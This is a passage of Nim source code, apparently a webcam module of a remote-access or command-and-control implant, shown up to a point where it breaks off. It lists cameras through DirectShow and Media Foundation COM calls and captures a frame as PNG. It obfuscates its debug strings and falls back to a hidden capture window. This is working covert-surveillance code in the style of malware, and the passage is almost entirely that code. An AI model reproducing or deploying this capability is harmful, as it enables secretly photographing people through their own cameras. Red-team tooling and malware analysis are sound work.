import ../utils/debug
import ../utils/strenc
import ../utils/m_responses
import std/[json, strformat, base64, math, widestrs]
when defined(windows):
  import winim/lean
  import pixie

when defined(windows):
  const
    WM_USER = 0x0400
    WM_CAP_START = WM_USER
    WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10
    WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11
    WM_CAP_GRAB_FRAME_NOSTOP = WM_CAP_START + 61
    WM_CAP_EDIT_COPY = WM_CAP_START + 30
    WS_POPUP = cast[int32](0x80000000'u32)
    CHUNK_SIZE = 512000  # 512KB chunks

  proc capCreateCaptureWindowA(
    lpszWindowName: LPCSTR,
    dwStyle: DWORD,
    x: int32, y: int32,
    nWidth: int32, nHeight: int32,
    hWnd: HWND,
    nID: int32
  ): HWND {.stdcall, dynlib: "avicap32.dll", importc.}

  const
    CLSID_SystemDeviceEnum_Val = DEFINE_GUID("62BE5D10-60EB-11d0-BD3B-00A0C911CE86")
    CLSID_VideoInputDeviceCategory_Val = DEFINE_GUID("860BB310-5D01-11d0-BD3B-00A0C911CE86")
    IID_ICreateDevEnum_Val = DEFINE_GUID("29840822-5B84-11D0-BD3B-00A0C911CE86")
    IID_IPropertyBag_Val = DEFINE_GUID("55272A00-42CB-11CE-8135-00AA004BB851")
    VT_BSTR_VAL: uint16 = 8

  proc CoInitializeEx(pvReserved: pointer, dwCoInit: DWORD): HRESULT
    {.stdcall, dynlib: "ole32.dll", importc.}
  proc CoUninitialize() {.stdcall, dynlib: "ole32.dll", importc.}
  proc CoCreateInstance(rclsid: ptr GUID, pUnkOuter: pointer, dwClsContext: DWORD,
                        riid: ptr GUID, ppv: ptr pointer): HRESULT
                        {.stdcall, dynlib: "ole32.dll", importc.}
  proc VariantInit(pvarg: pointer) {.stdcall, dynlib: "oleaut32.dll", importc.}
  proc VariantClear(pvarg: pointer): HRESULT {.stdcall, dynlib: "oleaut32.dll", importc.}

  template comVtbl(obj: pointer): ptr UncheckedArray[pointer] =
    cast[ptr ptr UncheckedArray[pointer]](obj)[]

  proc comRelease(obj: pointer) =
    if obj != nil:
      let fn = cast[proc(self: pointer): ULONG {.stdcall.}](comVtbl(obj)[2])
      discard fn(obj)

  type
    VariantFlat {.packed.} = object
      vt: uint16
      wReserved1: uint16
      wReserved2: uint16
      wReserved3: uint16
      data: array[16, byte]

  proc readBstrProp(propBag: pointer, propName: string): string =
    result = ""
    var v: VariantFlat
    zeroMem(addr v, sizeof(VariantFlat))
    VariantInit(addr v)
    let ws = newWideCString(propName)
    # IPropertyBag::Read = vtable[3] (IUnknown:3 + Read)
    let readFn = cast[proc(self: pointer, name: pointer, pv: pointer,
                           errLog: pointer): HRESULT {.stdcall.}](comVtbl(propBag)[3])
    let wsPtr = cast[pointer](addr ws[0])
    if readFn(propBag, wsPtr, addr v, nil) >= 0 and v.vt == VT_BSTR_VAL:
      let bstr = cast[ptr pointer](addr v.data[0])[]
      if bstr != nil:
        result = $cast[WideCString](bstr)
    discard VariantClear(addr v)

  proc enumerateWebcamsDShow*(): seq[tuple[index: int, name: string, path: string]] =
    ## Enumerate video capture devices via DirectShow COM (ICreateDevEnum).
    result = @[]
    let hrInit = CoInitializeEx(nil, 0)
    let needUninit = hrInit >= 0
    defer:
      if needUninit: CoUninitialize()

    var pDevEnum: pointer = nil
    var clsid = CLSID_SystemDeviceEnum_Val
    var iid = IID_ICreateDevEnum_Val
    if CoCreateInstance(addr clsid, nil, 0x1.DWORD,
                        addr iid, addr pDevEnum) < 0 or pDevEnum == nil:
      debug obf("[DEBUG] Failed to create DirectShow SystemDeviceEnum")
      return
    defer: comRelease(pDevEnum)

    # ICreateDevEnum::CreateClassEnumerator = vtable[3] (IUnknown:3 + CreateClassEnumerator)
    var pEnum: pointer = nil
    var vidCat = CLSID_VideoInputDeviceCategory_Val
    let createEnumFn = cast[proc(self: pointer, c: ptr GUID, pp: ptr pointer,
                                 f: DWORD): HRESULT {.stdcall.}](comVtbl(pDevEnum)[3])
    if createEnumFn(pDevEnum, addr vidCat, addr pEnum, 0) < 0 or pEnum == nil:
      debug obf("[DEBUG] No DirectShow video input devices found")
      return
    defer: comRelease(pEnum)

    # IEnumMoniker::Next = vtable[3] (IUnknown:3 + Next)
    var idx = 0
    while true:
      var pMoniker: pointer = nil
      var fetched: ULONG = 0
      let nextFn = cast[proc(self: pointer, n: ULONG, o: ptr pointer,
                             f: ptr ULONG): HRESULT {.stdcall.}](comVtbl(pEnum)[3])
      if nextFn(pEnum, 1, addr pMoniker, addr fetched) != 0 or pMoniker == nil:
        break

      # IMoniker::BindToStorage = vtable[9]
      # (IUnknown:3 + IPersist:1 + IPersistStream:4 + BindToObject + BindToStorage)
      var pBag: pointer = nil
      var iidBag = IID_IPropertyBag_Val
      let bindFn = cast[proc(self: pointer, bc: pointer, left: pointer,
                             riid: ptr GUID, ppv: ptr pointer): HRESULT
                             {.stdcall.}](comVtbl(pMoniker)[9])
      if bindFn(pMoniker, nil, nil, addr iidBag, addr pBag) >= 0 and pBag != nil:
        let name = readBstrProp(pBag, "FriendlyName")
        let path = readBstrProp(pBag, "DevicePath")
        if name.len > 0:
          result.add((index: idx, name: name, path: path))
        comRelease(pBag)

      comRelease(pMoniker)
      idx += 1

  # ---- Media Foundation capture for modern USB camera support ----
  # VFW/avicap32 capture fails on many modern USB cameras.
  # Media Foundation (mfplat/mf/mfreadwrite) provides reliable capture.
  # DLLs loaded dynamically to avoid crash on Server Core / minimal installs.
  const
    MF_VERSION = cast[int32](0x00020070'u32)
    MF_SOURCE_READER_FIRST_VIDEO_STREAM = cast[DWORD](0xFFFFFFFC'u32)
    COINIT_APARTMENTTHREADED: DWORD = 0x2
    MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_Key = DEFINE_GUID("c60ac5fe-252a-478f-a0ef-bc8fa5f7cad3")
    MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_Val = DEFINE_GUID("8ac3587a-4ae7-42d8-99e0-0a6013eef90f")
    IID_IMFMediaSource_Val = DEFINE_GUID("279a808d-aec7-40c8-9c6b-a6b492c78a66")
    MF_MT_MAJOR_TYPE_Key = DEFINE_GUID("48eba18e-f8c9-4687-bf11-0a74c9f96a8f")
    MFMediaType_Video_Val = DEFINE_GUID("73646976-0000-0010-8000-00aa00389b71")
    MF_MT_SUBTYPE_Key = DEFINE_GUID("f7e34c9a-42e8-4714-b74b-cb29d72c35e5")
    MFVideoFormat_RGB32_Val = DEFINE_GUID("00000016-0000-0010-8000-00aa00389b71")
    MFVideoFormat_NV12_Val = DEFINE_GUID("3231564E-0000-0010-8000-00aa00389b71")
    MFVideoFormat_YUY2_Val = DEFINE_GUID("32595559-0000-0010-8000-00aa00389b71")
    MF_MT_FRAME_SIZE_Key = DEFINE_GUID("1652c33d-d6b2-4012-b834-72030849a37d")
    MF_MT_DEFAULT_STRIDE_Key = DEFINE_GUID("644b4e48-1e02-4516-b0eb-c01ca9d49ac5")
    MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING_Key = DEFINE_GUID("fb394f3d-ccf1-42ee-bbb3-f9b845d5681d")

  proc CoTaskMemFree(pv: pointer) {.stdcall, dynlib: "ole32.dll", importc.}

  type
    FnMFStartup = proc(ver: ULONG, flags: DWORD): HRESULT {.stdcall.}
    FnMFShutdown = proc(): HRESULT {.stdcall.}
    FnMFCreateAttributes = proc(pp: ptr pointer, n: UINT32): HRESULT {.stdcall.}
    FnMFCreateMediaType = proc(pp: ptr pointer): HRESULT {.stdcall.}
    FnMFEnumDeviceSources = proc(a: pointer, pp: ptr pointer, c: ptr UINT32): HRESULT {.stdcall.}
    FnMFCreateSourceReader = proc(s: pointer, a: pointer, r: ptr pointer): HRESULT {.stdcall.}

  proc toHex(hr: HRESULT): string =
    let u = cast[uint32](hr)
    result = "0x"
    const hexChars = "0123456789ABCDEF"
    for i in countdown(7, 0):
      result.add hexChars[int((u shr (i * 4)) and 0xF)]

  # IMFAttributes vtable offsets (verified from Wine mfobjects.idl):
  # [3] GetItem, [4] GetItemType, [5] CompareItem, [6] Compare,
  # [7] GetUINT32, [8] GetUINT64, [9] GetDouble, [10] GetGUID,
  # [11] GetStringLength, [12] GetString, [13] GetAllocatedString,
  # [14] GetBlobSize, [15] GetBlob, [16] GetAllocatedBlob,
  # [17] GetUnknown, [18] SetItem, [19] DeleteItem, [20] DeleteAllItems,
  # [21] SetUINT32, [22] SetUINT64, [23] SetDouble, [24] SetGUID,
  # [25] SetString, [26] SetBlob, [27] SetUnknown,
  # [28] LockStore, [29] UnlockStore, [30] GetCount, [31] GetItemByIndex, [32] CopyAllItems

  # IMFActivate (inherits IMFAttributes): [33] ActivateObject, [34] ShutdownObject, [35] DetachObject
  # IMFSample (inherits IMFAttributes):
  #   [33] GetSampleFlags, [34] SetSampleFlags, [35] GetSampleTime, [36] SetSampleTime,
  #   [37] GetSampleDuration, [38] SetSampleDuration, [39] GetBufferCount, [40] GetBufferByIndex,
  #   [41] ConvertToContiguousBuffer, [42] AddBuffer, [43] RemoveBufferByIndex, [44] RemoveAllBuffers,
  #   [45] GetTotalLength, [46] CopyToBuffer

  # IMFSourceReader (inherits IUnknown):
  #   [3] GetStreamSelection, [4] SetStreamSelection, [5] GetNativeMediaType,
  #   [6] GetCurrentMediaType, [7] SetCurrentMediaType, [8] SetCurrentPosition,
  #   [9] ReadSample, [10] Flush, [11] GetServiceForStream, [12] GetPresentationAttribute

  # IMFMediaBuffer (inherits IUnknown): [3] Lock, [4] Unlock, [5] GetCurrentLength, [6] SetCurrentLength, [7] GetMaxLength

  proc captureWebcamFrameMF(deviceIndex: int): seq[byte] =
    ## Capture a webcam frame via Media Foundation.
    ## Returns PNG data, or empty seq on failure.
    result = @[]

    # Load MF DLLs dynamically (not present on Server Core / Nano)
    let hMfplat = LoadLibraryA(cast[LPCSTR](cstring"mfplat.dll"))
    if hMfplat == 0:
      debug obf("[MF] mfplat.dll not available")
      return
    let hMf = LoadLibraryA(cast[LPCSTR](cstring"mf.dll"))
    if hMf == 0:
      debug obf("[MF] mf.dll not available")
      return
    let hMfrw = LoadLibraryA(cast[LPCSTR](cstring"mfreadwrite.dll"))
    if hMfrw == 0:
      debug obf("[MF] mfreadwrite.dll not available")
      return

    let mfStartup = cast[FnMFStartup](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFStartup")))
    let mfShutdown = cast[FnMFShutdown](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFShutdown")))
    let mfCreateAttrs = cast[FnMFCreateAttributes](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFCreateAttributes")))
    let mfCreateMT = cast[FnMFCreateMediaType](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFCreateMediaType")))
    let mfEnumDevSrc = cast[FnMFEnumDeviceSources](GetProcAddress(hMf, cast[LPCSTR](cstring"MFEnumDeviceSources")))
    let mfCreateReader = cast[FnMFCreateSourceReader](GetProcAddress(hMfrw, cast[LPCSTR](cstring"MFCreateSourceReaderFromMediaSource")))

    if mfStartup == nil or mfShutdown == nil or mfCreateAttrs == nil or
       mfCreateMT == nil or mfEnumDevSrc == nil or mfCreateReader == nil:
      debug obf("[MF] Failed to resolve MF functions")
      return

    # Init COM as STA (webcam devices often require single-threaded apartment)
    let hrCom = CoInitializeEx(nil, COINIT_APARTMENTTHREADED)
    let needComUninit = hrCom >= 0
    debugLog "webcam", &"CoInitializeEx(STA) = {toHex(hrCom)}"
    defer:
      if needComUninit: CoUninitialize()

    var hr = mfStartup(MF_VERSION, 0)
    if hr < 0:
      debugLog "webcam", &"MFStartup failed: {toHex(hr)}"
      return
    defer: discard mfShutdown()

    # Create attributes for source reader with video processing enabled
    var pReaderConfig: pointer = nil
    hr = mfCreateAttrs(addr pReaderConfig, 1)
    if hr >= 0 and pReaderConfig != nil:
      # IMFAttributes::SetUINT32 = vtable[21]
      var vpKey = MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING_Key
      let setU32Fn = cast[proc(self: pointer, key: ptr GUID, val: UINT32): HRESULT {.stdcall.}](comVtbl(pReaderConfig)[21])
      discard setU32Fn(pReaderConfig, addr vpKey, 1)
      debug obf("[MF] Video processing enabled on reader config")

    # Enumerate video capture devices
    var pConfig: pointer = nil
    hr = mfCreateAttrs(addr pConfig, 1)
    if hr < 0 or pConfig == nil:
      debugLog "webcam", &"MFCreateAttributes(enum) failed: {toHex(hr)}"
      if pReaderConfig != nil: comRelease(pReaderConfig)
      return
    defer: comRelease(pConfig)

    var srcTypeKey = MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_Key
    var srcTypeVal = MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_Val
    # IMFAttributes::SetGUID = vtable[24]
    let setGuidFn = cast[proc(self: pointer, key: ptr GUID, val: ptr GUID): HRESULT {.stdcall.}](comVtbl(pConfig)[24])
    hr = setGuidFn(pConfig, addr srcTypeKey, addr srcTypeVal)
    if hr < 0:
      debugLog "webcam", &"SetGUID(SOURCE_TYPE) failed: {toHex(hr)}"
      if pReaderConfig != nil: comRelease(pReaderConfig)
      return

    var ppDevices: pointer = nil
    var deviceCount: UINT32 = 0
    hr = mfEnumDevSrc(pConfig, addr ppDevices, addr deviceCount)
    if hr < 0 or ppDevices == nil:
      debugLog "webcam", &"MFEnumDeviceSources failed: {toHex(hr)}, count={deviceCount}"
      if pReaderConfig != nil: comRelease(pReaderConfig)
      return

    let devices = cast[ptr UncheckedArray[pointer]](ppDevices)
    defer:
      for i in 0 ..< deviceCount.int:
        comRelease(devices[i])
      CoTaskMemFree(ppDevices)

    debugLog "webcam", &"Found {deviceCount} device(s), requesting index {deviceIndex}"

    if deviceIndex >= deviceCount.int:
      debug obf("[MF] device index out of range")
      if pReaderConfig != nil: comRelease(pReaderConfig)
      return

    # Activate device -> IMFMediaSource
    var pSource: pointer = nil
    var iidSource = IID_IMFMediaSource_Val
    # IMFActivate::ActivateObject = vtable[33]
    let activateFn = cast[proc(self: pointer, riid: ptr GUID, ppv: ptr pointer): HRESULT {.stdcall.}](comVtbl(devices[deviceIndex])[33])
    hr = activateFn(devices[deviceIndex], addr iidSource, addr pSource)
    if hr < 0 or pSource == nil:
      debugLog "webcam", &"ActivateObject failed: {toHex(hr)}"
      if pReaderConfig != nil: comRelease(pReaderConfig)
      return
    defer: comRelease(pSource)

    debug obf("[MF] Media source activated")

    # Create source reader with video processing attributes
    var pReader: pointer = nil
    hr = mfCreateReader(pSource, pReaderConfig, addr pReader)
    if pReaderConfig != nil: comRelease(pReaderConfig)
    if hr < 0 or pReader == nil:
      debugLog "webcam", &"MFCreateSourceReaderFromMediaSource failed: {toHex(hr)}"
      return
    defer: comRelease(pReader)

    debug obf("[MF] Source reader created")

    # Create output media type requesting RGB32
    var pOutType: pointer = nil
    hr = mfCreateMT(addr pOutType)
    if hr < 0 or pOutType == nil:
      debugLog "webcam", &"MFCreateMediaType failed: {toHex(hr)}"
      return
    defer: comRelease(pOutType)

    var majorKey = MF_MT_MAJOR_TYPE_Key
    var videoVal = MFMediaType_Video_Val
    var subKey = MF_MT_SUBTYPE_Key
    var rgb32Val = MFVideoFormat_RGB32_Val
    # IMFAttributes::SetGUID = vtable[24]
    let setGuidFn2 = cast[proc(self: pointer, key: ptr GUID, val: ptr GUID): HRESULT {.stdcall.}](comVtbl(pOutType)[24])
    discard setGuidFn2(pOutType, addr majorKey, addr videoVal)
    discard setGuidFn2(pOutType, addr subKey, addr rgb32Val)

    # IMFSourceReader::SetCurrentMediaType = vtable[7]
    let setMTFn = cast[proc(self: pointer, idx: DWORD, reserved: pointer, typ: pointer): HRESULT {.stdcall.}](comVtbl(pReader)[7])
    hr = setMTFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, nil, pOutType)
    if hr < 0:
      debugLog "webcam", &"SetCurrentMediaType(RGB32) failed: {toHex(hr)}, trying NV12..."
      # Try NV12 as fallback — many webcams only output this natively
      var nv12Val = MFVideoFormat_NV12_Val
      discard setGuidFn2(pOutType, addr subKey, addr nv12Val)
      hr = setMTFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, nil, pOutType)
      if hr < 0:
        debugLog "webcam", &"SetCurrentMediaType(NV12) also failed: {toHex(hr)}, trying YUY2..."
        var yuy2Val = MFVideoFormat_YUY2_Val
        discard setGuidFn2(pOutType, addr subKey, addr yuy2Val)
        hr = setMTFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, nil, pOutType)
        if hr < 0:
          debugLog "webcam", &"SetCurrentMediaType(YUY2) also failed: {toHex(hr)}"
          return

    debugLog "webcam", &"Media type set OK: {toHex(hr)}"

    # Let camera warm up
    Sleep(500)

    # Read warmup frames + actual frame
    # IMFSourceReader::ReadSample = vtable[9]
    let readSampleFn = cast[proc(self: pointer, si: DWORD, cf: DWORD,
        asi: ptr DWORD, sf: ptr DWORD, ts: ptr int64, s: ptr pointer): HRESULT {.stdcall.}](comVtbl(pReader)[9])

    for i in 0 ..< 5:
      var warmup: pointer = nil
      var wFlags: DWORD = 0
      hr = readSampleFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, nil, addr wFlags, nil, addr warmup)
      debugLog "webcam", &"warmup frame {i}: hr={toHex(hr)}, flags={wFlags}, sample={cast[int](warmup)}"
      if warmup != nil: comRelease(warmup)

    # Read the actual frame
    var pSample: pointer = nil
    var streamFlags: DWORD = 0
    hr = readSampleFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, nil, addr streamFlags, nil, addr pSample)
    if hr < 0 or pSample == nil:
      debugLog "webcam", &"ReadSample failed: hr={toHex(hr)}, flags={streamFlags}, sample={cast[int](pSample)}"
      return
    defer: comRelease(pSample)

    debugLog "webcam", &"Got sample, flags={streamFlags}"

    # IMFSample::ConvertToContiguousBuffer = vtable[41]
    var pBuffer: pointer = nil
    let convertFn = cast[proc(self: pointer, pp: ptr pointer): HRESULT {.stdcall.}](comVtbl(pSample)[41])
    hr = convertFn(pSample, addr pBuffer)
    if hr < 0 or pBuffer == nil:
      debugLog "webcam", &"ConvertToContiguousBuffer failed: {toHex(hr)}"
      return
    defer: comRelease(pBuffer)

    # IMFMediaBuffer::Lock = vtable[3]
    var pData: pointer = nil
    var maxLen: DWORD = 0
    var curLen: DWORD = 0
    let lockFn = cast[proc(self: pointer, pp: ptr pointer, mx: ptr DWORD, cur: ptr DWORD): HRESULT {.stdcall.}](comVtbl(pBuffer)[3])
    hr = lockFn(pBuffer, addr pData, addr maxLen, addr curLen)
    if hr < 0:
      debugLog "webcam", &"Lock failed: {toHex(hr)}"
      return

    debugLog "webcam", &"Buffer locked: maxLen={maxLen}, curLen={curLen}"

    # Get frame dimensions from the negotiated output media type
    var pCurType: pointer = nil
    # IMFSourceReader::GetCurrentMediaType = vtable[6]
    let getCurTypeFn = cast[proc(self: pointer, idx: DWORD, pp: ptr pointer): HRESULT {.stdcall.}](comVtbl(pReader)[6])
    hr = getCurTypeFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, addr pCurType)
    if hr < 0 or pCurType == nil:
      debugLog "webcam", &"GetCurrentMediaType failed: {toHex(hr)}"
      let unlockFn = cast[proc(self: pointer): HRESULT {.stdcall.}](comVtbl(pBuffer)[4])
      discard unlockFn(pBuffer)
      return

    var frameSize: uint64 = 0
    var frameSizeKey = MF_MT_FRAME_SIZE_Key
    # IMFAttributes::GetUINT64 = vtable[8]
    let getU64Fn = cast[proc(self: pointer, key: ptr GUID, val: ptr uint64): HRESULT {.stdcall.}](comVtbl(pCurType)[8])
    discard getU64Fn(pCurType, addr frameSizeKey, addr frameSize)

    # Check stride to determine top-down vs bottom-up
    var strideU32: UINT32 = 0
    var strideKey = MF_MT_DEFAULT_STRIDE_Key
    # IMFAttributes::GetUINT32 = vtable[7]
    let getU32Fn = cast[proc(self: pointer, key: ptr GUID, val: ptr UINT32): HRESULT {.stdcall.}](comVtbl(pCurType)[7])
    discard getU32Fn(pCurType, addr strideKey, addr strideU32)
    let stride = cast[int32](strideU32)
    let bottomUp = stride < 0

    # Also check what subtype was negotiated
    var actualSubtype: GUID
    var subKeyChk = MF_MT_SUBTYPE_Key
    # IMFAttributes::GetGUID = vtable[10]
    let getGuidFn = cast[proc(self: pointer, key: ptr GUID, val: ptr GUID): HRESULT {.stdcall.}](comVtbl(pCurType)[10])
    discard getGuidFn(pCurType, addr subKeyChk, addr actualSubtype)

    comRelease(pCurType)

    let width = int32((frameSize shr 32) and 0xFFFFFFFF'u64)
    let height = int32(frameSize and 0xFFFFFFFF'u64)
    let absStride = if stride != 0: abs(stride) else: width * 4

    debugLog "webcam", &"frame: {width}x{height}, stride={stride}, {curLen} bytes, bottomUp={bottomUp}"
    debugLog "webcam", &"subtype Data1={actualSubtype.Data1}"

    if width <= 0 or height <= 0 or curLen == 0:
      let unlockFn = cast[proc(self: pointer): HRESULT {.stdcall.}](comVtbl(pBuffer)[4])
      discard unlockFn(pBuffer)
      debug obf("[MF] Invalid dimensions or no data")
      return

    # Check if output is RGB32 (Data1=0x16) — if so, direct pixel copy
    # If NV12 (Data1=0x3231564E) or YUY2 (Data1=0x32595559), do conversion
    let isRGB32 = actualSubtype.Data1 == cast[int32](0x00000016'u32)

    var image = newImage(width, height)
    let rawData = cast[ptr UncheckedArray[byte]](pData)

    if isRGB32:
      for y in 0 ..< height:
        let srcY = if bottomUp: (height - 1 - y) else: y
        for x in 0 ..< width:
          let srcIdx = srcY * absStride + x * 4
          let dstIdx = y * width + x
          if srcIdx + 3 < curLen.int32 and dstIdx < image.data.len:
            image.data[dstIdx].b = rawData[srcIdx + 0]
            image.data[dstIdx].g = rawData[srcIdx + 1]
            image.data[dstIdx].r = rawData[srcIdx + 2]
            image.data[dstIdx].a = 255
    else:
      # NV12/YUY2: For NV12, plane Y is WxH bytes, then UV interleaved W*H/2 bytes.
      # For YUY2/YUYV: packed YUYV, 2 pixels per 4 bytes
      let isNV12 = actualSubtype.Data1 == cast[int32](0x3231564E'u32)
      if isNV12:
        let yPlaneStride = if stride != 0: absStride else: width
        let uvOffset = yPlaneStride * height
        for y in 0 ..< height:
          for x in 0 ..< width:
            let yIdx = y * yPlaneStride + x
            let uvIdx = uvOffset + (y div 2) * yPlaneStride + (x and (not 1))
            if yIdx < curLen.int32 and uvIdx + 1 < curLen.int32:
              let yVal = rawData[yIdx].int
              let uVal = rawData[uvIdx].int - 128
              let vVal = rawData[uvIdx + 1].int - 128
              let r = clamp(yVal + ((359 * vVal) shr 8), 0, 255)
              let g = clamp(yVal - ((88 * uVal + 183 * vVal) shr 8), 0, 255)
              let b = clamp(yVal + ((454 * uVal) shr 8), 0, 255)
              let dstIdx = y * width + x
              if dstIdx < image.data.len:
                image.data[dstIdx].r = r.byte
                image.data[dstIdx].g = g.byte
                image.data[dstIdx].b = b.byte
                image.data[dstIdx].a = 255
      else:
        # YUY2: YUYV packed, 2 pixels per 4 bytes
        let yuy2Stride = if stride != 0: absStride else: width * 2
        for y in 0 ..< height:
          let srcY = if bottomUp: (height - 1 - y) else: y
          for x in countup(0, width - 2, 2):
            let srcIdx = srcY * yuy2Stride + x * 2
            if srcIdx + 3 < curLen.int32:
              let y0 = rawData[srcIdx].int
              let u  = rawData[srcIdx + 1].int - 128
              let y1 = rawData[srcIdx + 2].int
              let v  = rawData[srcIdx + 3].int - 128
              for px in 0 ..< 2:
                let yVal = if px == 0: y0 else: y1
                let r = clamp(yVal + ((359 * v) shr 8), 0, 255)
                let g = clamp(yVal - ((88 * u + 183 * v) shr 8), 0, 255)
                let b = clamp(yVal + ((454 * u) shr 8), 0, 255)
                let dstIdx = y * width + x + px
                if dstIdx < image.data.len:
                  image.data[dstIdx].r = r.byte
                  image.data[dstIdx].g = g.byte
                  image.data[dstIdx].b = b.byte
                  image.data[dstIdx].a = 255

    # IMFMediaBuffer::Unlock = vtable[4]
    let unlockFn = cast[proc(self: pointer): HRESULT {.stdcall.}](comVtbl(pBuffer)[4])
    discard unlockFn(pBuffer)

    result = cast[seq[byte]](image.encodeImage(PngFormat))
    debugLog "webcam", &"capture success: {result.len} bytes PNG"

  proc getHostname(): string =
    var buffer: array[256, WCHAR]
    var size: DWORD = 256
    if GetComputerNameW(cast[LPWSTR](addr buffer[0]), addr size) != 0:
      return $cast[WideCString](addr buffer[0])
    return "unknown"

  proc enumerateWebcamsMF*(): seq[tuple[index: int, name: string]] =
    ## Enumerate video capture devices via Media Foundation (matches what webcam_snap uses).
    ## Falls back to DirectShow names if MF can't read FRIENDLY_NAME attribute.
    result = @[]
    let hMfplat = LoadLibraryA(cast[LPCSTR](cstring"mfplat.dll"))
    if hMfplat == 0: return
    let hMf = LoadLibraryA(cast[LPCSTR](cstring"mf.dll"))
    if hMf == 0: return

    let mfStartup = cast[FnMFStartup](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFStartup")))
    let mfShutdown = cast[FnMFShutdown](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFShutdown")))
    let mfCreateAttrs = cast[FnMFCreateAttributes](GetProcAddress(hMfplat, cast[LPCSTR](cstring"MFCreateAttributes")))
    let mfEnumDevSrc = cast[FnMFEnumDeviceSources](GetProcAddress(hMf, cast[LPCSTR](cstring"MFEnumDeviceSources")))
    if mfStartup == nil or mfShutdown == nil or mfCreateAttrs == nil or mfEnumDevSrc == nil:
      return

    let hrCom = CoInitializeEx(nil, COINIT_APARTMENTTHREADED)
    let needComUninit = hrCom >= 0
    debugLog "webcam:enum", &"CoInitializeEx(STA) = {toHex(hrCom)}"
    defer:
      if needComUninit: CoUninitialize()

    if mfStartup(MF_VERSION, 0) < 0: return
    defer: discard mfShutdown()

    var pConfig: pointer = nil
    if mfCreateAttrs(addr pConfig, 1) < 0 or pConfig == nil: return
    defer: comRelease(pConfig)

    var srcTypeKey = MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_Key
    var srcTypeVal = MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_Val
    let setGuidFn = cast[proc(self: pointer, key: ptr GUID, val: ptr GUID): HRESULT {.stdcall.}](comVtbl(pConfig)[24])
    if setGuidFn(pConfig, addr srcTypeKey, addr srcTypeVal) < 0: return

    var ppDevices: pointer = nil
    var deviceCount: UINT32 = 0
    if mfEnumDevSrc(pConfig, addr ppDevices, addr deviceCount) < 0 or ppDevices == nil: return
    debugLog "webcam:enum", &"found {deviceCount} device(s)"

    let devices = cast[ptr UncheckedArray[pointer]](ppDevices)
    defer:
      for i in 0 ..< deviceCount.int:
        comRelease(devices[i])
      CoTaskMemFree(ppDevices)

    # Get DirectShow device names as fallback (known to work for USB cameras)
    let dsNames = enumerateWebcamsDShow()
    debugLog "webcam:enum", &"DirectShow fallback has {dsNames.len} device(s)"

    # Read friendly name from each IMFActivate (which inherits IMFAttributes)
    # IMFAttributes::GetCount = vtable[30], GetString = vtable[12], GetAllocatedString = vtable[13]
    let MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME = DEFINE_GUID("60d32670-4de9-4fae-8eb2-e6b2b3afc6e3")
    for i in 0 ..< deviceCount.int:
      var nameKey = MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME

      # Debug: how many attributes does this device have?
      var attrCount: UINT32 = 0
      let getCountFn = cast[proc(self: pointer, pc: ptr UINT32): HRESULT {.stdcall.}](comVtbl(devices[i])[30])
      discard getCountFn(devices[i], addr attrCount)
      debugLog "webcam:enum", &"device {i} has {attrCount} attributes"

      # Try GetString (vtable[12])
      var nameBuf: array[256, WCHAR]
      var nameLen: UINT32 = 0
      let getStrFn = cast[proc(self: pointer, key: ptr GUID, pwsz: pointer, cchBuf: UINT32, pcch: ptr UINT32): HRESULT {.stdcall.}](comVtbl(devices[i])[12])
      let hrName = getStrFn(devices[i], addr nameKey, addr nameBuf[0], 256, addr nameLen)
      debugLog "webcam:enum", &"device {i} GetString(FRIENDLY_NAME) hr={toHex(hrName)} nameLen={nameLen}"
      if hrName >= 0 and nameLen > 0:
        let name = $cast[WideCString](addr nameBuf[0])
        result.add((index: i, name: name))
      else:
        # Fallback: try GetAllocatedString (vtable[13])
        var pName: pointer = nil
        var allocLen: UINT32 = 0
        let getAllocStr = cast[proc(self: pointer, key: ptr GUID, ppwsz: ptr pointer, pcch: ptr UINT32): HRESULT {.stdcall.}](comVtbl(devices[i])[13])
        let hrAlloc = getAllocStr(devices[i], addr nameKey, addr pName, addr allocLen)
        debugLog "webcam:enum", &"device {i} GetAllocatedString hr={toHex(hrAlloc)}"
        if hrAlloc >= 0 and pName != nil:
          let name = $cast[WideCString](pName)
          CoTaskMemFree(pName)
          result.add((index: i, name: name))
        elif i < dsNames.len:
          # Use DirectShow name as fallback
          debugLog "webcam:enum", &"device {i} using DirectShow name: {dsNames[i].name}"
          result.add((index: i, name: dsNames[i].name))
        else:
          result.add((index: i, name: &"Device {i}"))

  proc captureWebcamFrame*(deviceIndex: int): seq[byte] =
    ## Capture a single frame from the specified webcam device.
    ## Tries Media Foundation first, falls back to VFW/avicap32.
    ## Returns PNG-encoded image data.
    result = captureWebcamFrameMF(deviceIndex)
    if result.len > 0:
      return
    debug obf("[DEBUG] MF capture failed, falling back to VFW")
    result = @[]

    # Create a hidden capture window
    let hCapWnd = capCreateCaptureWindowA(
      cast[LPCSTR](cstring"WebcamCapture"),
      WS_POPUP,
      0, 0, 640, 480,
      0, 0
    )
    if hCapWnd == 0:
      debugLog "webcam", "Failed to create capture window"
      return

    defer:
      DestroyWindow(hCapWnd)

    # Connect to the specified camera device
    if SendMessageA(hCapWnd, WM_CAP_DRIVER_CONNECT, deviceIndex, 0) == 0:
